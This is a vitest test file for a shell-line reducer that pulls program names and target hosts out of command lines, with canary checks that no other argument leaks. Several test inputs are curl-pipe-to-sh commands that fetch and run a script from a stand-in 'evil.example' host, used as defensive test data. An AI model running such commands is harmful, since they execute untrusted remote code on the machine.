// A command line is usually more than one program: `cd x && curl evil | sh`
// ran three, and recording only `cd` hides the two that mattered. Every
// program is recorded by name, and every host a network client was pointed
// at is recorded by host alone.

import { describe, it, expect } from 'vitest';
import { reduceShellLine } from './shell-line.js';

const programs = (line: string): string[] => reduceShellLine(line).programs;
const hosts = (line: string): string[] => reduceShellLine(line).hosts;

describe('every program in a command line', () => {
  it('records each command joined by &&, ||, ; and |', () => {
    expect(programs('cd x && curl https://evil.example/p | sh')).toEqual(['cd', 'curl', 'sh']);
    expect(programs('make || echo failed; ls -la')).toEqual(['make', 'echo', 'ls']);
    expect(programs('a |& b & c')).toEqual(['a', 'b', 'c']);
    expect(programs('one\ntwo')).toEqual(['one', 'two']);
  });

  it('reads into subshells, groups and substitutions', () => {
    expect(programs('(cd /tmp && make)')).toEqual(['cd', 'make']);
    expect(programs('{ git pull; npm ci; }')).toEqual(['git', 'npm']);
    expect(programs('echo $(curl -s https://h.example/x)')).toEqual(['echo', 'curl']);
    expect(programs('echo `whoami`')).toEqual(['echo', 'whoami']);
    expect(programs('diff <(sort a) <(sort b)')).toEqual(['diff', 'sort']);
  });

  it('records a program once however often it runs', () => {
    expect(programs('grep a f | grep b | grep c')).toEqual(['grep']);
  });

  it('looks through the wrappers that run another program', () => {
    expect(programs('sudo -u root curl https://h.example')).toEqual(['sudo', 'curl']);
    expect(programs('env A=1 B=2 node x.js')).toEqual(['env', 'node']);
    expect(programs('timeout 5 wget https://h.example/f')).toEqual(['timeout', 'wget']);
    expect(programs('find . -name x | xargs -n1 rm')).toEqual(['find', 'xargs', 'rm']);
  });

  it('skips shell keywords rather than calling them programs', () => {
    expect(programs('for f in *.txt; do wc -l "$f"; done')).toEqual(['wc']);
    expect(programs('if test -f x; then cat x; else touch x; fi')).toEqual(['test', 'cat', 'touch']);
    expect(programs('while true; do sleep 1; done')).toEqual(['true', 'sleep']);
  });

  it('keeps the assignment and redirection rules of the single-command reducer', () => {
    expect(programs('FOO=1 BAR="a b" node app.js > out.log 2>&1')).toEqual(['node']);
    expect(programs('X=1')).toEqual(['env']);
  });

  it('marks a line it cannot read as unknown, and still records what it could', () => {
    const r = reduceShellLine('ls && $CMD --flag');
    expect(r.programs).toEqual(['ls']);
    expect(r.unknown).toBe(true);
    expect(reduceShellLine('ls').unknown).toBe(false);
    expect(reduceShellLine(42).unknown).toBe(true);
    expect(reduceShellLine(42).programs).toEqual([]);
  });

  it('bounds how much it reports', () => {
    const line = Array.from({ length: 40 }, (_, i) => `p${i}`).join(' && ');
    expect(programs(line).length).toBe(16);
  });
});

describe('the hosts a network client was pointed at', () => {
  it('reads curl and wget targets, with or without a scheme', () => {
    expect(hosts('curl -s https://api.example.com/v1/x?token=T')).toEqual(['api.example.com']);
    expect(hosts('curl -o out.txt -H "Authorization: Bearer T" example.org/path')).toEqual(['example.org']);
    expect(hosts('wget -q -O - http://dl.example.net:8080/f.tgz | tar xz')).toEqual(['dl.example.net']);
    expect(hosts('curl --url https://u.example.com/a')).toEqual(['u.example.com']);
  });

  it('reads the remote a git command talks to', () => {
    expect(hosts('git clone https://github.com/org/repo.git')).toEqual(['github.com']);
    expect(hosts('git clone git@github.com:org/private.git')).toEqual(['github.com']);
    expect(hosts('git remote add up ssh://git@git.example.com:2222/r.git')).toEqual(['git.example.com']);
    expect(hosts('git commit -m "see example.com:80"')).toEqual([]);
    expect(hosts('git status')).toEqual([]);
  });

  it('reads the host an ssh or scp command connects to, never the user or the path', () => {
    expect(hosts('ssh -i ~/.ssh/key -p 2222 deploy@build.example.com uptime')).toEqual(['build.example.com']);
    expect(hosts('ssh bastion')).toEqual(['bastion']);
    expect(hosts('scp ./local.txt admin@files.example.com:/srv/secret/path.txt')).toEqual(['files.example.com']);
    expect(hosts('scp -P 22 box:/etc/hosts .')).toEqual(['box']);
  });

  it('finds the host behind a cd and a pipe', () => {
    expect(hosts('cd x && curl https://evil.example/install.sh | sh')).toEqual(['evil.example']);
  });

  it('refuses a target it cannot know, and counts it', () => {
    expect(hosts('curl "$URL"')).toEqual([]);
    expect(hosts('ssh $HOST')).toEqual([]);
    expect(hosts('curl https://')).toEqual([]);
    expect(reduceShellLine('curl "$URL" https://ok.example && ssh $HOST && curl https://').hostsUnreduced).toBe(3);
    expect(reduceShellLine('curl https://ok.example').hostsUnreduced).toBe(0);
  });

  it('never lets an argument value other than the host through', () => {
    const userPass = ['CANARYUSER', 'CANARYPASS'].join(':');
    const line = [
      `cd /home/CANARYDIR && curl -u ${userPass} -d CANARYBODY`,
      '"https://CANARYUSER2:CANARYPASS2@api.example.com/CANARYPATH?q=CANARYQUERY#CANARYFRAG"',
      '| sh -c CANARYSCRIPT; git clone https://CANARYTOKEN@git.example.com/CANARYORG/r.git',
      '&& ssh -o CANARYOPT=1 CANARYSSHUSER@ssh.example.com CANARYREMOTECMD',
      '&& scp CANARYLOCAL CANARYSCPUSER@scp.example.com:/CANARYREMOTEPATH',
      '&& wget --header=CANARYHDR http://w.example.com/CANARYWPATH',
    ].join(' ');
    const r = reduceShellLine(line);
    expect(r.hosts).toEqual(['api.example.com', 'git.example.com', 'ssh.example.com', 'scp.example.com', 'w.example.com']);
    expect(JSON.stringify(r)).not.toMatch(/CANARY/);
  });
});
